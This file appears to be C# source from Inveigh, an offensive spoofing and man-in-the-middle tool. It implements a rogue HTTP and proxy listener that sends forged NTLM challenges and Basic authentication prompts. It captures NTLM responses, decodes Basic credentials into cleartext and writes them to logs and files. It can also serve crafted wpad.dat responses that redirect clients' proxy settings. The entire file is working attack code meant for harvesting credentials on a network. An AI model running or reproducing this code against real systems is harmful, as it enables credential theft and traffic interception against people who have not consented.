using System;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace Inveigh
{
    class HTTP
    {

        public static void HTTPListener(string method, string ipVersion, string httpIP, string httpPort)
        {
            TcpListener httpListener = null;
            TcpClient httpClient = new TcpClient();
            IAsyncResult httpAsync;
            IPAddress listenerIPAddress = IPAddress.Any;

            if (String.Equals(ipVersion, "IPv4") && !String.Equals(httpIP, "0.0.0.0"))
            {
                listenerIPAddress = IPAddress.Parse(httpIP);
            }
            else if (String.Equals(ipVersion, "IPv6"))
            {
                listenerIPAddress = IPAddress.IPv6Any;
            }

            int httpPortNumber = Int32.Parse(httpPort);
            httpListener = new TcpListener(listenerIPAddress, httpPortNumber);
            httpListener.Server.ExclusiveAddressUse = false;
            httpListener.ExclusiveAddressUse = false;
            httpListener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);

            if (String.Equals(method, "Proxy"))
            {
                httpListener.Server.LingerState = new LingerOption(true, 0);
            }

            try
            {
                httpListener.Start();
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[!] Error starting unprivileged {1} listener, check IP and port usage.", DateTime.Now.ToString("s"), method));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {
                httpAsync = httpListener.BeginAcceptTcpClient(null, null);

                do
                {
                    Thread.Sleep(10);

                    if (Program.exitInveigh)
                    {
                        break;
                    }

                }
                while (!httpAsync.IsCompleted);

                httpClient = httpListener.EndAcceptTcpClient(httpAsync);
                object[] httpParams = { method, httpIP, httpPort, httpClient };
                ThreadPool.QueueUserWorkItem(new WaitCallback(GetHTTPClient), httpParams);
            }

        }

        public static void GetHTTPClient(object parameters)
        {
            object[] parameterArray = parameters as object[];
            string method = Convert.ToString(parameterArray[0]);
            string httpIP = Convert.ToString(parameterArray[1]);
            string httpPort = Convert.ToString(parameterArray[2]);
            TcpClient httpClient = (TcpClient)parameterArray[3];           
            string rawURL = "";
            string rawURLOld = "";
            int httpReset = 0;
            NetworkStream httpStream = httpClient.GetStream();

            while (httpClient.Connected)
            {

                try
                {
                    string contentLength = "Content-Length: 0";
                    string httpMethod = "";
                    string request = "";
                    string authorizationNTLM = "NTLM";
                    bool proxyIgnoreMatch = false;
                    bool wpadAuthIgnoreMatch = false;
                    bool ntlmESS = false;
                    string headerAuthorization = "";
                    string headerHost = "";
                    string headerUserAgent = "";
                    byte[] headerContentType = Encoding.UTF8.GetBytes("Content-Type: text/html");
                    byte[] headerAuthenticate = null;
                    byte[] headerAuthenticateData = null;
                    byte[] headerCacheControl = null;
                    byte[] headerStatusCode = null;
                    byte[] responsePhrase = null;
                    byte[] message = null;               
                    byte[] requestData = new byte[4096];
                    bool clientClose = false;
                    bool connectionHeaderClose = false;
                    string httpNTLMStage = "";
                    httpReset++;
                    string[] httpMethods = { "GET", "HEAD", "OPTIONS", "CONNECT", "POST", "PROPFIND" };
                    DateTime currentTime = DateTime.Now;
                    byte[] timestamp = Encoding.UTF8.GetBytes(currentTime.ToString("R"));

                    while (httpStream.DataAvailable)
                    {
                        httpStream.Read(requestData, 0, requestData.Length);
                    }

                    request = BitConverter.ToString(requestData);

                    if (request.StartsWith("47-45-54-20"))
                    {
                        httpMethod = "GET";
                    }
                    else if (request.StartsWith("48-45-41-44-20"))
                    {
                        httpMethod = "HEAD";
                    }
                    else if (request.StartsWith("4F-50-54-49-4F-4E-53-20"))
                    {
                        httpMethod = "OPTIONS";
                    }
                    else if (request.StartsWith("43-4F-4E-4E-45-43-54-20"))
                    {
                        httpMethod = "CONNECT";
                    }
                    else if (request.StartsWith("50-4F-53-54-20"))
                    {
                        httpMethod = "POST";
                    }
                    else if (request.StartsWith("50-52-4F-50-46-49-4E-44-20"))
                    {
                        httpMethod = "PROPFIND";
                    }
                    else
                    {
                        httpMethod = "UNSUPPORTED";
                    }

                    if (!String.IsNullOrEmpty(request) && Array.Exists(httpMethods, element => element == httpMethod))
                    {
                        rawURL = request.Substring(request.IndexOf("-20-") + 4, request.Substring(request.IndexOf("-20-") + 1).IndexOf("-20-") - 3);
                        rawURL = Util.HexStringToString(rawURL);
                        string sourceIP = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Address.ToString();
                        string sourcePort = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Port.ToString();
                        connectionHeaderClose = true;

                        if (request.Contains("-48-6F-73-74-3A-20-")) // Host:
                        {
                            headerHost = request.Substring(request.IndexOf("-48-6F-73-74-3A-20-") + 19); // Host:
                            headerHost = headerHost.Substring(0, headerHost.IndexOf("-0D-0A-"));
                            headerHost = Util.HexStringToString(headerHost);
                        }

                        if (request.Contains("-55-73-65-72-2D-41-67-65-6E-74-3A-20-")) // User-Agent:
                        {
                            headerUserAgent = request.Substring(request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37); // User-Agent:
                            headerUserAgent = headerUserAgent.Substring(0, headerUserAgent.IndexOf("-0D-0A-"));
                            headerUserAgent = Util.HexStringToString(headerUserAgent);
                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP {3} request for {4} from {5}:{6}", DateTime.Now.ToString("s"), method, httpPort, httpMethod, rawURL, sourceIP, sourcePort));
                            Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP host header {3} from {4}:{5}", DateTime.Now.ToString("s"), method, httpPort, headerHost, sourceIP, sourcePort));

                            if (!String.IsNullOrEmpty(headerUserAgent))
                            {
                                Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP user agent from {3}:{4}:{5}{6}", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort, Environment.NewLine, headerUserAgent));
                            }

                        }

                        if (Program.enabledProxy && Program.argProxyIgnore != null && Program.argProxyIgnore.Length > 0)
                        {

                            foreach (string agent in Program.argProxyIgnore) // todo check
                            {

                                if (headerUserAgent.ToUpper().Contains(agent.ToUpper()))
                                {
                                    proxyIgnoreMatch = true;
                                }

                            }

                            if (proxyIgnoreMatch)
                            {
                                lock (Program.outputList)
                                {
                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) ignoring wpad.dat request for proxy due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort));

                                }

                            }

                        }

                        if (request.Contains("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-")) // Authorization:
                        {
                            headerAuthorization = request.Substring(request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46); // Authorization:
                            headerAuthorization = headerAuthorization.Substring(0, headerAuthorization.IndexOf("-0D-0A-"));
                            headerAuthorization = Util.HexStringToString(headerAuthorization);
                        }

                        if (!Util.ArrayIsNullOrEmpty(Program.argWPADAuthIgnore) && Program.argWPADAuth.ToUpper().StartsWith("NTLM "))
                        {

                            foreach (string agent in Program.argWPADAuthIgnore)
                            {

                                if (headerUserAgent.ToUpper().Contains(agent.ToUpper()))
                                {
                                    wpadAuthIgnoreMatch = true;
                                }

                            }

                            if (wpadAuthIgnoreMatch)
                            {

                                lock (Program.outputList)
                                {
                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) switching wpad.dat auth to anonymous due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort));
                                }

                            }

                        }

                        if (!String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argHTTPAuth, "ANONYMOUS") || String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argWPADAuth, "ANONYMOUS") || wpadAuthIgnoreMatch)
                        {
                            headerStatusCode = new byte[] { 0x32, 0x30, 0x30 }; // 200
                            responsePhrase = new byte[] { 0x4f, 0x4b }; // OK
                            clientClose = true;
                        }
                        else
                        {

                            if (String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argWPADAuth, "NTLM") || String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argHTTPAuth, "NTLM"))
                            {
                                ntlmESS = true;
                            }

                            if (String.Equals(method, "Proxy"))
                            {
                                headerStatusCode = new byte[] { 0x34, 0x30, 0x37 }; // 407
                                headerAuthenticate = Encoding.UTF8.GetBytes("Proxy-Authenticate: ");
                            }
                            else
                            {
                                headerStatusCode = new byte[] { 0x34, 0x30, 0x31 }; // 401
                                headerAuthenticate = Encoding.UTF8.GetBytes("WWW-Authenticate: ");
                            }

                            responsePhrase = new byte[] { 0x55, 0x6e, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64 }; //  Unauthorized
                        }

                        if (headerAuthorization.ToUpper().StartsWith("NTLM "))
                        {
                            headerAuthorization = headerAuthorization.Substring(5, headerAuthorization.Length - 5);
                            byte[] httpAuthorization = Convert.FromBase64String(headerAuthorization);
                            httpNTLMStage = BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray());
                            connectionHeaderClose = false;

                            if ((BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("01-00-00-00"))
                            {
                                authorizationNTLM = GetNTLMChallengeBase64(method, ntlmESS, sourceIP, sourcePort, httpPort);
                            }
                            else if ((BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("03-00-00-00"))
                            {
                                NTLM.GetNTLMResponse(httpAuthorization, sourceIP, sourcePort, method, httpPort, null);
                                headerStatusCode = new byte[] { 0x32, 0x30, 0x30 }; // 200
                                responsePhrase = new byte[] { 0x4f, 0x4b }; // OK
                                clientClose = true;

                                if (String.Equals(method, "Proxy"))
                                {

                                    if (!String.IsNullOrEmpty(Program.argHTTPResponse))
                                    {
                                        headerCacheControl = Encoding.UTF8.GetBytes("Cache-Control: no-cache, no-store");
                                    }

                                }

                            }
                            else
                            {
                                clientClose = true;
                            }

                        }
                        else if (headerAuthorization.ToUpper().StartsWith("BASIC "))
                        {
                            headerStatusCode = new byte[] { 0x32, 0x30, 0x30 }; // 200
                            responsePhrase = new byte[] { 0x4f, 0x4b }; // OK
                            string httpHeaderAuthorizationBase64 = headerAuthorization.Substring(6, headerAuthorization.Length - 6);
                            string cleartextCredentials = Encoding.UTF8.GetString(Convert.FromBase64String(httpHeaderAuthorizationBase64));

                            lock (Program.cleartextList)
                            {
                                Program.cleartextList.Add(String.Concat(sourceIP, " ", cleartextCredentials));
                            }

                            lock (Program.outputList)
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) Basic authentication cleartext credentials captured from {3}({4}):", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort));
                                Program.outputList.Add(cleartextCredentials);
                            }

                            if (Program.enabledFileOutput)
                            {

                                lock (Program.cleartextFileList)
                                {
                                    Program.cleartextFileList.Add(String.Concat(sourceIP, " ", cleartextCredentials));
                                }

                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) Basic authentication cleartext credentials written to {3}", DateTime.Now.ToString("s"), method, httpPort, String.Concat(Program.argFilePrefix, "-Cleartext.txt")));
                            }

                        }

                        if (!String.IsNullOrEmpty(Program.argWPADResponse) && !proxyIgnoreMatch && String.Equals(rawURL, "/wpad.dat") && clientClose)
                        {
                            headerContentType = Encoding.UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig");
                            message = Encoding.UTF8.GetBytes(Program.argWPADResponse);
                        }
                        else if (!String.IsNullOrEmpty(Program.argHTTPResponse))
                        {
                            message = Encoding.UTF8.GetBytes(Program.argHTTPResponse);
                        }

                        if ((Program.argHTTPAuth.StartsWith("NTLM") && !String.Equals(rawURL, "/wpad.dat")) || (Program.argWPADAuth.StartsWith("NTLM") && String.Equals(rawURL, "/wpad.dat")))
                        {
                            headerAuthenticateData = Encoding.UTF8.GetBytes(authorizationNTLM);
                        }
                        else if ((String.Equals(Program.argHTTPAuth, "BASIC") && !String.Equals(rawURL, "/wpad.dat")) || String.Equals(Program.argWPADAuth, "BASIC") && String.Equals(rawURL, "/wpad.dat"))
                        {
                            headerAuthenticateData = Encoding.UTF8.GetBytes(String.Concat("Basic realm=", Program.argHTTPBasicRealm));
                        }

                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            memoryStream.Write((new byte[9] { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20 }), 0, 9); // HTTP/1.1
                            memoryStream.Write(headerStatusCode, 0, headerStatusCode.Length);
                            memoryStream.Write((new byte[1] { 0x20 }), 0, 1);
                            memoryStream.Write(responsePhrase, 0, responsePhrase.Length);
                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (connectionHeaderClose)
                            {
                                byte[] httpHeaderConnection = Encoding.UTF8.GetBytes("Connection: close");
                                memoryStream.Write(httpHeaderConnection, 0, httpHeaderConnection.Length);
                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            byte[] headerServer = Encoding.UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0");
                            memoryStream.Write(headerServer, 0, headerServer.Length);
                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            memoryStream.Write((new byte[6] { 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20 }), 0, 6); // Date: 
                            memoryStream.Write(timestamp, 0, timestamp.Length);
                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (!Util.ArrayIsNullOrEmpty(headerAuthenticate) && !Util.ArrayIsNullOrEmpty(headerAuthenticateData))
                            {
                                memoryStream.Write(headerAuthenticate, 0, headerAuthenticate.Length);
                                memoryStream.Write(headerAuthenticateData, 0, headerAuthenticateData.Length);
                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            if (!Util.ArrayIsNullOrEmpty(headerContentType))
                            {
                                memoryStream.Write(headerContentType, 0, headerContentType.Length);
                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            if (!Util.ArrayIsNullOrEmpty(headerCacheControl))
                            {
                                memoryStream.Write(headerCacheControl, 0, headerCacheControl.Length);
                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            if (!Util.ArrayIsNullOrEmpty(message))
                            {
                                contentLength = "Content-Length: " + message.Length;
                            }
                            else
                            {
                                contentLength = "Content-Length: 0";
                            }

                            byte[] headerContentLength = Encoding.UTF8.GetBytes(contentLength);
                            memoryStream.Write(headerContentLength, 0, headerContentLength.Length);
                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (!Util.ArrayIsNullOrEmpty(message))
                            {
                                memoryStream.Write(message, 0, message.Length);
                            }

                            if ((!Util.ArrayIsNullOrEmpty(Program.argSpooferIPsIgnore) && Array.Exists(Program.argSpooferIPsIgnore, element => element == sourceIP)) || (!Util.ArrayIsNullOrEmpty(Program.argSpooferIPsReply) && !Array.Exists(Program.argSpooferIPsReply, element => element == sourceIP)))
                            {

                                lock (Program.outputList)
                                {
                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) HTTP {3} request for {4} ignored from {5}:{6}", DateTime.Now.ToString("s"), method, httpPort, httpMethod, rawURL, sourceIP, sourcePort));
                                }            

                            }
                            else
                            {
                                httpStream.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
                                httpStream.Flush();
                            }

                        }

                        rawURLOld = rawURL;

                        if (clientClose)
                        {

                            if (String.Equals(method, "Proxy"))
                            {
                                httpClient.Client.Close();
                            }
                            else
                            {
                                httpClient.Close();
                            }

                        }

                    }
                    else
                    {

                        if(connectionHeaderClose || httpReset > 20)
                        {
                            httpClient.Close();
                        }
                        else
                        {
                            Thread.Sleep(10);
                        }

                    }

                    Thread.Sleep(100);
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] HTTP listener error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static string GetNTLMChallengeBase64(string method, bool ntlmESS, string ipAddress, string sourcePort, string destinationPort)
        {
            byte[] timestamp = BitConverter.GetBytes(DateTime.Now.ToFileTime());
            byte[] challengeData = new byte[8];
            string session = ipAddress + ":" + sourcePort;       
            string challenge = "";
            int destinationPortNumber = Int32.Parse(destinationPort);

            if (String.IsNullOrEmpty(Program.argChallenge))
            {
                string challengeCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                char[] challengeCharactersArray = new char[8];
                Random random = new Random();

                for (int i = 0; i < challengeCharactersArray.Length; i++)
                {
                    challengeCharactersArray[i] = challengeCharacters[random.Next(challengeCharacters.Length)];
                }

                string finalString = new String(challengeCharactersArray);
                challengeData = Encoding.UTF8.GetBytes(finalString);
                challenge = (BitConverter.ToString(challengeData)).Replace("-", "");
            }
            else
            {
                challenge = Program.argChallenge;
                string challengeMod = challenge.Insert(2, "-").Insert(5,"-").Insert(8,"-").Insert(11,"-").Insert(14,"-").Insert(17,"-").Insert(20,"-");
                int i = 0;

                foreach (string character in challengeMod.Split('-'))
                {
                    challengeData[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                    i++;
                }

            }

            lock (Program.outputList)
            {
                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLM challenge {3} sent to {4}", DateTime.Now.ToString("s"), method, destinationPort, challenge, session));
            }

            string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", String.Empty);
            Program.httpSessionTable[sessionTimestamp] = challenge;
            Program.httpSessionTable[session] = challenge;          

            byte[] ntlmNegotiationFlags = { 0x05, 0x82, 0x81, 0x0A };

            if (ntlmESS)
            {
                ntlmNegotiationFlags[2] = 0x89;
            }

            byte[] hostnameData = Encoding.Unicode.GetBytes(Program.computerName);
            byte[] netbiosDomainData = Encoding.Unicode.GetBytes(Program.netbiosDomain);
            byte[] dnsDomainData = Encoding.Unicode.GetBytes(Program.dnsDomain);
            byte[] dnsHostnameData = Encoding.Unicode.GetBytes(Program.computerName);
            byte[] hostnameLength = BitConverter.GetBytes(hostnameData.Length).Take(2).ToArray();
            byte[] netbiosDomainLength = BitConverter.GetBytes(netbiosDomainData.Length).Take(2).ToArray(); ;
            byte[] dnsDomainLength = BitConverter.GetBytes(dnsDomainData.Length).Take(2).ToArray(); ;
            byte[] dnsHostnameLength = BitConverter.GetBytes(dnsHostnameData.Length).Take(2).ToArray(); ;
            byte[] targetLength = BitConverter.GetBytes(hostnameData.Length + netbiosDomainData.Length + dnsDomainData.Length + dnsDomainData.Length + dnsHostnameData.Length + 36).Take(2).ToArray(); ;
            byte[] targetOffset = BitConverter.GetBytes(netbiosDomainData.Length + 56);

            using (MemoryStream memoryStream = new MemoryStream())
            {
                memoryStream.Write((new byte[12] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00 }), 0, 12); // NTLMSSP + 
                memoryStream.Write(netbiosDomainLength, 0, 2);
                memoryStream.Write(netbiosDomainLength, 0, 2);
                memoryStream.Write((new byte[4] { 0x38, 0x00, 0x00, 0x00 }), 0, 4);
                memoryStream.Write(ntlmNegotiationFlags, 0, 4);
                memoryStream.Write(challengeData, 0, challengeData.Length);
                memoryStream.Write((new byte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 8);
                memoryStream.Write(targetLength, 0, 2);
                memoryStream.Write(targetLength, 0, 2);
                memoryStream.Write(targetOffset, 0, 4);
                memoryStream.Write((new byte[8] { 0x0a, 0x01, 0x61, 0x4a, 0x00, 0x00, 0x00, 0x0f }), 0, 8); // version
                memoryStream.Write(netbiosDomainData, 0, netbiosDomainData.Length);
                memoryStream.Write((new byte[2] { 0x02, 0x00 }), 0, 2);
                memoryStream.Write(netbiosDomainLength, 0, 2);
                memoryStream.Write(netbiosDomainData, 0, netbiosDomainData.Length);
                memoryStream.Write((new byte[2] { 0x01, 0x00 }), 0, 2);
                memoryStream.Write(hostnameLength, 0, 2);
                memoryStream.Write(hostnameData, 0, hostnameData.Length);
                memoryStream.Write((new byte[2] { 0x04, 0x00 }), 0, 2);
                memoryStream.Write(dnsDomainLength, 0, 2);
                memoryStream.Write(dnsDomainData, 0, dnsDomainData.Length);
                memoryStream.Write((new byte[2] { 0x03, 0x00 }), 0, 2);
                memoryStream.Write(dnsHostnameLength, 0, 2);
                memoryStream.Write(dnsHostnameData, 0, dnsHostnameData.Length);
                memoryStream.Write((new byte[2] { 0x05, 0x00 }), 0, 2);
                memoryStream.Write(dnsDomainLength, 0, 2);
                memoryStream.Write(dnsDomainData, 0, dnsDomainData.Length);
                memoryStream.Write((new byte[4] { 0x07, 0x00, 0x08, 0x00 }), 0, 4);
                memoryStream.Write(timestamp, 0, timestamp.Length);
                memoryStream.Write((new byte[6] { 0x00, 0x00, 0x00, 0x00, 0x0a, 0x0a }), 0, 6);
                string ntlmChallengeBase64 = Convert.ToBase64String(memoryStream.ToArray());
                string ntlm = "NTLM " + ntlmChallengeBase64;

                return ntlm;
            }

        }

    }

}
